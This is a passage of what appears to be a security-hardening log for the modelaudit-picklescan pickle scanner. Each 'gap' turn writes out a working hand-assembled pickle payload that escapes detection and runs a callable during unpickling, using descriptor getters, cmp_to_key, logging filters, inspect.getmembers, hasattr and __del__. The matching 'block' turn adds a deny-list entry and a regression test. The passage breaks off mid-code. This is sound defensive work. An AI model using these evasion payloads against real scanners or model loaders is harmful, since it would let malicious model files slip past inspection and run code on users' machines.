## Turn 65 - `builtins.classmethod.__get__` bound-method gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag, using `classmethod.__get__` to
bind an attacker-selected function to an attacker-controlled object before a
later stack call.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_builtins_classmethod_get_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("builtins", "classmethod"),
        sg("pathlib", "Path.touch"),
        b"\x85R\x94",
        sg("builtins", "classmethod.__get__"),
        b"(",
        b"h\x00",
        b"N",
        sg("pathlib", "PosixPath"),
        b"(",
        *(s(part) for part in marker.parts),
        b"tR",
        b"tR\x94",
        b"h\x01)R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`, `notices=[]`
- Coverage: `bytes_scanned=163`, `bytes_total=163`, `opcode_count=32`,
  `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `builtins.classmethod`, `pathlib.Path.touch`,
  `builtins.classmethod.__get__`, and `pathlib.PosixPath`, all with
  `is_dangerous=False`
- Control proof: the same pickle without the final empty-argument `REDUCE`
  returns `<bound method Path.touch of PosixPath(...)>` and does not create
  `/tmp/ma_builtins_classmethod_get_marker`
- Unpickle result: the full payload creates
  `/tmp/ma_builtins_classmethod_get_marker` and returns `None`
- RCE mechanism: `classmethod.__get__(cm, None, marker)` returns a bound method
  whose `__self__` is the marker path. The payload first constructs
  `classmethod(pathlib.Path.touch)`, then uses the unbound descriptor getter to
  synthesize `Path.touch` bound to the attacker-chosen `Path`, then invokes the
  bound method with an empty argument tuple during deserialization.

Why the scanner missed it:

- `builtins.classmethod` is absent from `BUILTIN_DANGEROUS_NAMES`.
- `builtins.classmethod.__get__` is also absent from
  `BUILTIN_DANGEROUS_NAMES`, and builtin checks are exact-name checks even
  when the pickle `STACK_GLOBAL` name contains dots.
- The payload uses only currently clean globals:
  `builtins.classmethod`, `pathlib.Path.touch`,
  `builtins.classmethod.__get__`, and `pathlib.PosixPath`.
- The dangerous callable is hidden inside a synthesized bound method before
  the final stack-object call, so the final `REDUCE` has no policy-listed
  global to classify.
- The payload has no suspicious string seeds such as `eval(`, `exec(`,
  `__import__`, `os.system`, or `subprocess`.

Performance note: this is the `classmethod` sibling of the descriptor-method
surface, and the focused next block can stay cheap: add `classmethod.__get__`
to `BUILTIN_DANGEROUS_NAMES`, plus a manual-pickle oracle regression proving
scan-time detection before the bound method creates the marker. The hot path
remains the existing builtin exact-name membership check.

## Turn 66 - Block `builtins.classmethod.__get__` bound methods

Blocking plan:

- Add `classmethod.__get__` to `BUILTIN_DANGEROUS_NAMES`. The exact dotted
  builtin name reaches the descriptor method that can bind an attacker-selected
  function to an attacker-controlled object.
- Leave `builtins.classmethod` itself allowed because constructing the
  descriptor does not execute or bind the wrapped callable. The sink is the
  descriptor-get method that synthesizes the later callable bound method.
- Add a CPython oracle regression that builds the manual
  `classmethod(Path.touch)` payload, verifies scan-time detection on the
  descriptor-get control and RCE variants, proves the control bound method does
  not create the marker, then proves the full payload creates the marker during
  `pickle.loads()`.
- Add a changelog entry under `[Unreleased]` because this strengthens
  user-visible pickle detection coverage.

Performance note: the fix is a single exact builtin-name membership check. It
does not add descriptor-object tracking, bound-method state modeling, or stack
call simulation.

## Turn 67 - `types.DynamicClassAttribute.__get__` descriptor getter gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag, using the `types` module's
property-like descriptor helper to call an attacker-selected getter during
deserialization.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_types_dynamicclassattribute_get_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("types", "DynamicClassAttribute"),
        sg("pathlib", "Path.touch"),
        b"\x85R\x94",
        sg("types", "DynamicClassAttribute.__get__"),
        b"h\x00",
        sg("pathlib", "PosixPath"),
        b"(",
        *(s(part) for part in marker.parts),
        b"tR",
        b"\x86R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`, `notices=[]`
- Coverage: `bytes_scanned=177`, `bytes_total=177`, `opcode_count=26`,
  `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `types.DynamicClassAttribute`,
  `pathlib.Path.touch`, `types.DynamicClassAttribute.__get__`, and
  `pathlib.PosixPath`, all with `is_dangerous=False`
- Control proof: the same pickle without the final descriptor-get call returns
  `<types.DynamicClassAttribute ...>` with `fget=pathlib.Path.touch` and does
  not create `/tmp/ma_types_dynamicclassattribute_get_marker`
- Unpickle result: the full payload creates
  `/tmp/ma_types_dynamicclassattribute_get_marker` and returns `None`
- RCE mechanism: `DynamicClassAttribute.__get__(descriptor, instance)` calls
  `descriptor.fget(instance)` for non-class access. The payload first
  constructs `types.DynamicClassAttribute(pathlib.Path.touch)`, then calls the
  unbound descriptor getter with the attacker-chosen `Path` instance, causing
  `Path.touch(marker)` to execute before `pickle.loads()` returns.

Why the scanner missed it:

- `types.DynamicClassAttribute` is absent from `DANGEROUS_GLOBALS`; the current
  `types` coverage only lists `CodeType`, `FunctionType`, and `MethodType`.
- `types.DynamicClassAttribute.__get__` is also absent from
  `DANGEROUS_GLOBALS`.
- The payload uses only currently clean globals:
  `types.DynamicClassAttribute`, `pathlib.Path.touch`,
  `types.DynamicClassAttribute.__get__`, and `pathlib.PosixPath`.
- The dangerous function is stored inside a synthesized descriptor object, then
  reached through a clean-looking descriptor method rather than through a
  directly policy-listed callable.
- The payload has no suspicious string seeds such as `eval(`, `exec(`,
  `__import__`, `os.system`, or `subprocess`.

Performance note: this is the `types` sibling of the descriptor-getter surface.
The focused next block should add a sorted `DANGEROUS_GLOBALS` entry for
`("types", "DynamicClassAttribute.__get__")`, plus a manual-pickle oracle
regression proving scan-time detection before the descriptor getter creates
the marker. The hot path remains static binary-search policy lookup.

## Turn 68 - Block `types.DynamicClassAttribute.__get__` descriptor getters

Blocking plan:

- Add `("types", "DynamicClassAttribute.__get__")` to the sorted Rust
  `DANGEROUS_GLOBALS` table. The descriptor-get method invokes the
  attacker-controlled `fget` callable when accessed with an instance.
- Leave `types.DynamicClassAttribute` itself allowed because constructing the
  descriptor does not call the getter. The sink is the descriptor-get method,
  mirroring the earlier `property.__get__` block.
- Add a CPython oracle regression that builds the manual
  `DynamicClassAttribute(Path.touch)` payload, verifies the control descriptor
  still scans clean and does not create the marker, then verifies scan-time
  detection on the RCE variant before proving the getter creates the marker
  during `pickle.loads()`.
- Add a changelog entry under `[Unreleased]` because this strengthens
  user-visible pickle detection coverage.

Performance note: the fix adds one tuple to a sorted static table checked with
binary search. It does not add descriptor-object tracking, dotted-name
expansion, or stack-flow simulation.

## Turn 69 - `functools.cached_property.__get__` descriptor getter gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag, using `cached_property` to call
an attacker-selected getter during deserialization.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_functools_cached_property_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("types", "new_class"),
        s("DerivedPath"),
        sg("pathlib", "PosixPath"),
        b"\x85\x86R\x940",
        b"h\x00",
        s(str(marker)),
        b"\x85R\x940",
        sg("functools", "cached_property"),
        sg("pathlib", "Path.touch"),
        b"\x85R\x940",
        sg("functools", "cached_property.__set_name__"),
        b"(",
        b"h\x02",
        b"h\x00",
        s("x"),
        b"tR0",
        sg("functools", "cached_property.__get__"),
        b"(",
        b"h\x02",
        b"h\x01",
        b"h\x00",
        b"tR.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`, `notices=[]`
- Coverage: `bytes_scanned=263`, `bytes_total=263`, `opcode_count=49`,
  `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `types.new_class`, `pathlib.PosixPath`,
  `functools.cached_property`, `pathlib.Path.touch`,
  `functools.cached_property.__set_name__`, and
  `functools.cached_property.__get__`, all with `is_dangerous=False`
- Control proof: the same pickle without the final descriptor-get call returns
  `<functools.cached_property ...>` with `attrname="x"` and does not create
  `/tmp/ma_functools_cached_property_marker`
- Unpickle result: the full payload creates
  `/tmp/ma_functools_cached_property_marker` and returns `None`
- RCE mechanism: `cached_property.__get__(descriptor, instance, owner)` reads
  `instance.__dict__`, calls `descriptor.func(instance)`, then caches the
  result. The payload uses `types.new_class("DerivedPath", (PosixPath,))` to
  create a path subclass with an instance dictionary, arms
  `cached_property(Path.touch)` with `__set_name__`, and finally calls
  `cached_property.__get__(descriptor, marker_instance, DerivedPath)`, causing
  `Path.touch(marker_instance)` to execute before `pickle.loads()` returns.

Why the scanner missed it:

- `functools.cached_property` is absent from `DANGEROUS_GLOBALS`; current
  `functools` critical coverage includes `cache`, `lru_cache`, `reduce`, and
  `singledispatch`.
- `functools.cached_property.__set_name__` and
  `functools.cached_property.__get__` are also absent from
  `DANGEROUS_GLOBALS`.
- `types.new_class` is absent from `DANGEROUS_GLOBALS`; it is used here to
  create a `PosixPath` subclass with a `__dict__`, which lets
  `cached_property.__get__` reach the wrapped getter.
- The payload uses only currently clean globals:
  `types.new_class`, `pathlib.PosixPath`, `functools.cached_property`,
  `pathlib.Path.touch`, `functools.cached_property.__set_name__`, and
  `functools.cached_property.__get__`.
- The payload has no suspicious string seeds such as `eval(`, `exec(`,
  `__import__`, `os.system`, or `subprocess`.

Performance note: this is a descriptor-getter sink with a precise static name.
The focused next block should add a sorted `DANGEROUS_GLOBALS` entry for
`("functools", "cached_property.__get__")`, plus a manual-pickle oracle
regression proving scan-time detection before the descriptor getter creates
the marker. Blocking `cached_property.__set_name__` or `types.new_class` is not
required for this specific sink, so the hot path can remain one static
binary-search policy lookup.

## Turn 70 - Block `functools.cached_property.__get__` descriptor getters

Blocking plan:

- Add `("functools", "cached_property.__get__")` to the sorted Rust
  `DANGEROUS_GLOBALS` table. The descriptor-get method invokes the wrapped
  getter callable when accessed with an instance.
- Leave `functools.cached_property`, `cached_property.__set_name__`, and
  `types.new_class` allowed for this focused block. The execution sink is
  `cached_property.__get__`; the other helpers only construct the descriptor,
  name it, and create the path subclass needed by the proof.
- Add a CPython oracle regression that builds the manual
  `cached_property(Path.touch)` payload, verifies the descriptor setup control
  still scans clean and does not create the marker, then verifies scan-time
  detection on the RCE variant before proving the getter creates the marker
  during `pickle.loads()`.
- Add a changelog entry under `[Unreleased]` because this strengthens
  user-visible pickle detection coverage.

Performance note: the fix adds one tuple to a sorted static table checked with
binary search. It does not add descriptor-object tracking, cached-property
state modeling, or stack-flow simulation.

## Turn 71 - `functools.cmp_to_key` rich-comparison callback gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag, using a clean comparator
adapter plus a clean comparison helper to invoke an attacker-selected callable
during deserialization.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_functools_cmp_to_key_operator_lt_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("functools", "cmp_to_key"),
        sg("pathlib", "Path.write_text"),
        b"\x85R\x940",
        b"h\x00",
        sg("pathlib", "PosixPath"),
        b"(",
        *(s(part) for part in marker.parts),
        b"tR",
        b"\x85R\x940",
        b"h\x00",
        s("x"),
        b"\x85R\x940",
        sg("operator", "lt"),
        b"h\x01h\x02\x86R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`, `notices=[]`
- Coverage: `bytes_scanned=170`, `bytes_total=170`, `opcode_count=39`,
  `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `functools.cmp_to_key`,
  `pathlib.Path.write_text`, `pathlib.PosixPath`, and `operator.lt`, all with
  `is_dangerous=False`
- Control proof: the same pickle without the final `operator.lt` call returns
  two `<functools.KeyWrapper ...>` objects and does not create
  `/tmp/ma_functools_cmp_to_key_operator_lt_marker`
- Unpickle result: the full payload creates
  `/tmp/ma_functools_cmp_to_key_operator_lt_marker`, writes `x`, and returns
  `False`
- RCE mechanism: `functools.cmp_to_key(callable)` creates key-wrapper objects
  whose rich-comparison methods call the supplied comparator as
  `callable(left.obj, right.obj)`. The payload wraps
  `pathlib.Path.write_text`, builds one wrapper around the marker path and one
  around `"x"`, then calls `operator.lt(left, right)`. The comparison invokes
  `Path.write_text(marker, "x")` before `pickle.loads()` returns.

Why the scanner missed it:

- `functools.cmp_to_key` is absent from `DANGEROUS_GLOBALS`; current
  `functools` critical coverage includes `cache`, `cached_property.__get__`,
  `lru_cache`, `reduce`, and `singledispatch`.
- `operator.lt` is absent from `DANGEROUS_GLOBALS`; only `operator.call`,
  `operator.attrgetter`, `operator.itemgetter`, and `operator.methodcaller` are
  listed.
- The payload uses only currently clean globals:
  `functools.cmp_to_key`, `pathlib.Path.write_text`, `pathlib.PosixPath`, and
  `operator.lt`.
- The dangerous callable is hidden inside synthesized rich-comparison wrapper
  objects, so the final call target is the clean comparison helper rather than
  the attacker-selected function.
- The payload has no suspicious string seeds such as `eval(`, `exec(`,
  `__import__`, `os.system`, or `subprocess`.

Performance note: this is a comparator-wrapper sink with a precise static
factory. The focused next block should add a sorted `DANGEROUS_GLOBALS` entry
for `("functools", "cmp_to_key")`, plus a manual-pickle oracle regression
proving scan-time detection before comparison creates the marker. Blocking
generic `operator.lt` is not required for this specific sink, so the hot path
can remain one static binary-search policy lookup.

## Turn 72 - Block `functools.cmp_to_key` rich-comparison wrappers

Blocking plan:

- Add `("functools", "cmp_to_key")` to the sorted Rust `DANGEROUS_GLOBALS`
  table. The factory accepts an attacker-selected comparator and produces
  key-wrapper objects whose rich-comparison methods invoke it.
- Leave generic `operator.lt` allowed for this focused block. It only forces
  comparison; the dangerous sink is the comparator wrapper factory.
- Add a CPython oracle regression that builds the manual
  `cmp_to_key(Path.write_text)` payload, verifies scan-time detection on
  control and RCE variants, proves the control wrapper pair does not create the
  marker, then proves the full comparison writes the marker during
  `pickle.loads()`.
- Add a changelog entry under `[Unreleased]`.

Performance note: one tuple in the sorted static table, no rich-comparison
modeling.

## Turn 73 - `logging.Filterer.filter` callback pipeline gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag, using the stdlib logging
filter pipeline to invoke an attacker-selected callable during deserialization.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_logging_filterer_filter_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("logging", "Filterer"),
        b")R\x940",
        sg("logging", "Filterer.addFilter"),
        b"(",
        b"h\x00",
        sg("pathlib", "Path.touch"),
        b"tR0",
        sg("pathlib", "PosixPath"),
        b"(",
        *(s(part) for part in marker.parts),
        b"tR",
        b"\x940",
        sg("logging", "Filterer.filter"),
        b"(",
        b"h\x00",
        b"h\x01",
        b"tR.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`, `notices=[]`
- Coverage: `bytes_scanned=188`, `bytes_total=188`, `opcode_count=39`,
  `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `logging.Filterer`,
  `logging.Filterer.addFilter`, `pathlib.Path.touch`, `pathlib.PosixPath`, and
  `logging.Filterer.filter`, all with `is_dangerous=False`
- Control proof: the same pickle without the final `Filterer.filter` call
  returns a `logging.Filterer` containing the `Path.touch` filter and does not
  create `/tmp/ma_logging_filterer_filter_marker`
- Unpickle result: the full payload creates
  `/tmp/ma_logging_filterer_filter_marker` and returns `False`
- RCE mechanism: `logging.Filterer.addFilter(filter_callable)` stores an
  attacker-selected callable. `logging.Filterer.filter(record)` then iterates
  those filters and calls each callable as `filter_callable(record)`. The
  payload registers `pathlib.Path.touch`, constructs the marker path as the
  synthetic log record, and calls `Filterer.filter(filterer, marker)`, causing
  `Path.touch(marker)` before `pickle.loads()` returns.

Why the scanner missed it:

- `logging` is not a wildcard-dangerous module; only `logging.config`
  functions are currently listed.
- `logging.Filterer.filter` and `logging.Filterer.addFilter` are absent from
  `DANGEROUS_GLOBALS`.
- The payload uses only currently clean globals: `logging.Filterer`,
  `logging.Filterer.addFilter`, `pathlib.Path.touch`, `pathlib.PosixPath`, and
  `logging.Filterer.filter`.
- The dangerous callback is hidden in mutable logging filter state. The final
  called global is a logging helper that appears benign unless the scanner
  models the `Filterer.filters` callback list.
- The payload has no suspicious string seeds such as `eval(`, `exec(`,
  `__import__`, `os.system`, or `subprocess`.

Performance note: this is a precise callback-invocation sink. The focused next
block should add a sorted `DANGEROUS_GLOBALS` entry for
`("logging", "Filterer.filter")`, with an oracle regression proving that
filter registration alone does not execute but the filter pass does. Blocking
all of `logging` or all filter registration is unnecessary for this proof, so
the hot path can remain a static binary-search policy lookup.

## Turn 74 - Block `logging.Filterer.filter` callback pipelines

Blocking plan:

- Add `("logging", "Filterer.filter")` to the sorted Rust
  `DANGEROUS_GLOBALS` table. The method iterates stored filters and invokes
  attacker-controlled callables.
- Leave `logging.Filterer` and `logging.Filterer.addFilter` allowed for this
  focused block. They construct mutable filter state, but the side effect in
  the proof occurs when `Filterer.filter` runs the callback pipeline.
- Add a CPython oracle regression that builds the manual
  `Filterer.addFilter(Path.touch)` payload, verifies the registration-only
  control remains clean and does not create the marker, then verifies
  scan-time detection on the RCE variant before proving the filter pass creates
  the marker during `pickle.loads()`.
- Add a changelog entry under `[Unreleased]`.

Performance note: one tuple in the sorted static table, no logging-state or
filter-list modeling.

## Turn 75 - `inspect.getmembers` descriptor invocation gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag, using stdlib introspection to
invoke an attacker-controlled descriptor getter during deserialization.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_inspect_getmembers_property_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("builtins", "type"),
        b"(",
        s("DerivedPath"),
        sg("pathlib", "PosixPath"),
        b"\x85",
        b"}",
        s("x"),
        sg("builtins", "property"),
        sg("pathlib", "Path.touch"),
        b"\x85R",
        b"s",
        b"tR\x940",
        b"h\x00",
        s(str(marker)),
        b"\x85R\x940",
        sg("inspect", "getmembers"),
        b"h\x01\x85R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`, `notices=[]`
- Coverage: `bytes_scanned=186`, `bytes_total=186`, `opcode_count=38`,
  `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
  `builtins.property`, `pathlib.Path.touch`, and `inspect.getmembers`, all
  with `is_dangerous=False`
- Control proof: the same pickle without the final `inspect.getmembers` call
  returns a `DerivedPath` instance and does not create
  `/tmp/ma_inspect_getmembers_property_marker`
- Unpickle result: the full payload creates
  `/tmp/ma_inspect_getmembers_property_marker`; the returned member list
  contains `("x", None)` because `Path.touch(marker)` is the property value
- RCE mechanism: the payload uses `type(...)` to create a `pathlib.PosixPath`
  subclass with descriptor `x = property(pathlib.Path.touch)`. Calling
  `inspect.getmembers(instance)` walks names from `dir(instance)` and resolves
  each with `getattr(instance, name)`. Resolving `x` invokes the property
  getter as `Path.touch(instance)`, creating the marker before
  `pickle.loads()` returns.

Why the scanner missed it:

- `inspect` is not a wildcard-dangerous module, and `inspect.getmembers` is
  absent from `DANGEROUS_GLOBALS`.
- `builtins.type` and `builtins.property` are clean. The policy blocks direct
  `builtins.property.__get__` references, but this payload never imports that
  method explicitly.
- The payload uses only currently clean globals: `builtins.type`,
  `pathlib.PosixPath`, `builtins.property`, `pathlib.Path.touch`, and
  `inspect.getmembers`.
- The dangerous callable is hidden as a descriptor getter and is invoked by
  introspection, so the final visible call target is a clean inspection helper.
- The payload has no suspicious string seeds such as `eval(`, `exec(`,
  `__import__`, `os.system`, `subprocess`, or magic-method names.

Performance note: this is a precise introspection sink. The focused next block
should add a sorted `DANGEROUS_GLOBALS` entry for `("inspect", "getmembers")`,
with an oracle regression proving that class and descriptor construction alone
does not create the marker but introspective member collection does. Blocking
`inspect.getmembers_static` is not required for this proof because that helper
avoids dynamic descriptor lookup.

## Turn 76 - Block `inspect.getmembers` descriptor walks

Blocking plan:

- Add `("inspect", "getmembers")` to the sorted Rust `DANGEROUS_GLOBALS`
  table. The helper resolves discovered names with dynamic `getattr()` and can
  invoke attacker-controlled descriptors.
- Leave `builtins.type`, `builtins.property`, and `pathlib.PosixPath` allowed
  for this focused block. They synthesize the object graph, but the side effect
  in the proof occurs when `inspect.getmembers()` walks descriptors.
- Add a CPython oracle regression that builds the manual
  `type(..., {"x": property(Path.touch)})` payload, verifies class/instance
  construction remains clean and does not create the marker, then verifies
  scan-time detection on the RCE variant before proving introspection creates
  the marker during `pickle.loads()`.
- Add a changelog entry under `[Unreleased]`.

Performance note: one tuple in the sorted static table, no descriptor graph or
introspection-flow modeling.

## Turn 77 - `builtins.hasattr` descriptor invocation gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag, using a clean builtin
introspection helper to invoke an attacker-controlled descriptor getter during
deserialization.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_builtins_hasattr_property_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("builtins", "type"),
        b"(",
        s("DerivedPath"),
        sg("pathlib", "PosixPath"),
        b"\x85",
        b"}",
        s("x"),
        sg("builtins", "property"),
        sg("pathlib", "Path.touch"),
        b"\x85R",
        b"s",
        b"tR\x940",
        b"h\x00",
        s(str(marker)),
        b"\x85R\x940",
        sg("builtins", "hasattr"),
        b"h\x01",
        s("x"),
        b"\x86R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`, `notices=[]`
- Coverage: `bytes_scanned=185`, `bytes_total=185`, `opcode_count=39`,
  `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
  `builtins.property`, `pathlib.Path.touch`, and `builtins.hasattr`, all with
  `is_dangerous=False`
- Control proof: the same pickle without the final `hasattr` call returns a
  `DerivedPath` instance at `/tmp/ma_builtins_hasattr_property_marker` and does
  not create the marker
- Unpickle result: the full payload creates
  `/tmp/ma_builtins_hasattr_property_marker` and returns `True`
- RCE mechanism: the payload uses `type(...)` to create a `pathlib.PosixPath`
  subclass with descriptor `x = property(pathlib.Path.touch)`. Calling
  `hasattr(instance, "x")` performs dynamic attribute lookup and only suppresses
  `AttributeError`. Resolving `x` invokes the property getter as
  `Path.touch(instance)`, creating the marker before `pickle.loads()` returns.

Why the scanner missed it:

- `builtins.hasattr` is absent from `BUILTIN_DANGEROUS_NAMES`.
- `builtins.type` and `builtins.property` are clean. The policy blocks direct
  `builtins.property.__get__` and `builtins.getattr` references, but this
  payload never imports either method explicitly.
- The payload uses only currently clean globals: `builtins.type`,
  `pathlib.PosixPath`, `builtins.property`, `pathlib.Path.touch`, and
  `builtins.hasattr`.
- The dangerous callable is hidden as a descriptor getter and is invoked by the
  builtin attribute-existence check, so the final visible call target is a
  common builtin helper rather than the attacker-selected callable.
- The payload has no suspicious string seeds such as `eval(`, `exec(`,
  `__import__`, `os.system`, `subprocess`, or magic-method names.

Performance note: this is a precise builtin attribute-lookup sink. The focused
next block should add `hasattr` to `BUILTIN_DANGEROUS_NAMES`, with an oracle
regression proving that class and descriptor construction alone does not create
the marker but the `hasattr(instance, "x")` lookup does. This keeps the hot
path to the existing builtin-name policy check and avoids descriptor-flow
modeling.

## Turn 78 - Block `builtins.hasattr` descriptor lookups

Blocking plan:

- Add `hasattr` to `BUILTIN_DANGEROUS_NAMES`. The builtin performs dynamic
  attribute lookup and can invoke attacker-controlled descriptors while checking
  existence.
- Leave `builtins.type`, `builtins.property`, and `pathlib.PosixPath` allowed
  for this focused block. They synthesize the descriptor-bearing object graph,
  but the side effect in the proof occurs when `hasattr()` resolves the
  attribute.
- Add a CPython oracle regression that builds the manual
  `type(..., {"x": property(Path.touch)})` payload, verifies class/instance
  construction remains clean and does not create the marker, then verifies
  scan-time detection on the RCE variant before proving `hasattr(instance, "x")`
  creates the marker during `pickle.loads()`.
- Add a changelog entry under `[Unreleased]`.

Performance note: one entry in the existing builtin-name slice, no descriptor
graph or attribute-flow modeling.

## Turn 79 - `__del__` finalizer execution gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag, using object finalization to
invoke an attacker-controlled callable during deserialization.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_builtins_type_del_path_touch_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("builtins", "type"),
        b"(",
        s("DerivedPath"),
        sg("pathlib", "PosixPath"),
        b"\x85",
        b"}",
        s("__del__"),
        sg("pathlib", "Path.touch"),
        b"s",
        b"tR\x940",
        b"h\x00",
        s(str(marker)),
        b"\x85R",
        b"0N.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`, `notices=[]`
- Coverage: `bytes_scanned=144`, `bytes_total=144`, `opcode_count=27`,
  `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `builtins.type`, `pathlib.PosixPath`, and
  `pathlib.Path.touch`, all with `is_dangerous=False`
- Control proof: the same pickle without the final `POP` returns a
  `DerivedPath` instance at `/tmp/ma_builtins_type_del_path_touch_marker` and
  does not create the marker while the returned instance is retained
- Unpickle result: the full payload creates
  `/tmp/ma_builtins_type_del_path_touch_marker` and returns `None`
- RCE mechanism: the payload uses `type(...)` to create a `pathlib.PosixPath`
  subclass with `__del__ = pathlib.Path.touch`. It then instantiates that class
  at the marker path and immediately pops the only instance reference from the
  unpickler stack. CPython reference counting finalizes the object immediately,
  calling `Path.touch(instance)` before `pickle.loads()` returns.

Why the scanner missed it:

- `__del__` is not in the suspicious magic-method string list. Existing magic
  method coverage includes serialization and attribute access hooks such as
  `__reduce__`, `__setstate__`, `__getattribute__`, and `__getattr__`, but not
  finalizers.
- `builtins.type` and `pathlib.Path.touch` are clean; `pathlib` is not a
  wildcard-dangerous module.
- The payload uses only currently clean globals: `builtins.type`,
  `pathlib.PosixPath`, and `pathlib.Path.touch`.
- The dangerous callable is hidden in a synthesized finalizer slot, so no
  explicit call target imports `Path.touch` as dangerous.
- The payload has no suspicious string seeds such as `eval(`, `exec(`,
  `__import__`, `os.system`, `subprocess`, `__getattr__`, or
  `__getattribute__`.

Performance note: this is a precise magic-method seed gap. The focused next
block should add `__del__` to the suspicious magic-method string list, with an
oracle regression proving that a retained instance does not create the marker
but popping the only instance reference runs the finalizer during unpickling.
This keeps the hot path to the existing string-literal policy scan and avoids
object-lifetime modeling.

## Turn 80 - Block `__del__` finalizer seeds

Blocking plan:

- Add `__del__` to the existing suspicious magic-method string list. Finalizer
  names can route execution through object lifetime rather than an explicit
  call opcode.
- Leave `builtins.type`, `pathlib.PosixPath`, and `pathlib.Path.touch` allowed
  for this focused block. They synthesize the object graph, but the new static
  signal is the finalizer slot name.
- Add a CPython oracle regression that builds the manual
  `type(..., {"__del__": Path.touch})` payload, verifies scan-time detection on
  both the retained-instance control and stack-drop RCE variants, proves the
  retained instance does not create the marker, then proves popping the only
  reference creates the marker during `pickle.loads()`.
- Add a changelog entry under `[Unreleased]`.

Performance note: one literal in the existing magic-method match arm, no
object-lifetime or reference-count modeling.

## Turn 81 - `__eq__` rich-comparison method gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag, using a clean comparison helper
to invoke an attacker-controlled rich-comparison method during deserialization.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def sg(module: str, name: str) -> bytes:
